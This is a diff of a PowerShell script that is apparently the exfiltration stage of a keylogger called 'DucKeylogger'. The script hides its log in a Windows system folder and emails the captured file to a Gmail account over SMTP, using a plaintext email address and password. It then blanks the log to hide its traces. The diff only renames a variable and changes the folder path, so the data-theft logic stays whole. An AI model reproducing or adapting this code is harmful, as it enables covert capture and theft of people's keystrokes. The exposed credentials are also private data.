@@ -1,9 +1,9 @@
-﻿$FolderPath = "C:\Windows\PLA\Exceptions\" #Emplacement du payload
-$PayloadName = "cGF5ZGF5.txt" # Payday en base6
+$FolderPath = "C:\Windows\PLA\System\Exceptions\" #Emplacement du payload
+$PaydayName = "cGF5ZGF5.txt" # Payday en base6
 
 $Username = "shawnheyli@gmail.com"
 $EmailPassword = "NouKakTiMalaya"
-$Attachment = "$FolderPath$PayloadName"
+$Attachment = "$FolderPath$PaydayName"
 $EmailTo = "shawnheyli@gmail.com"
 $EmailFrom = "shawnheyli@gmail.com"
 $Subject = "DucKeylogger"
@@ -19,5 +19,5 @@ $SMTPClient.Send($SMTPMessage)
 
 $Attachment.Dispose()
 
-Set-Content $FolderPath$PayloadName -Value ""
+Set-Content $FolderPath$PaydayName -Value ""
 #Remove-Item -Path $FolderPath$PayloadName -Force -Recurse 
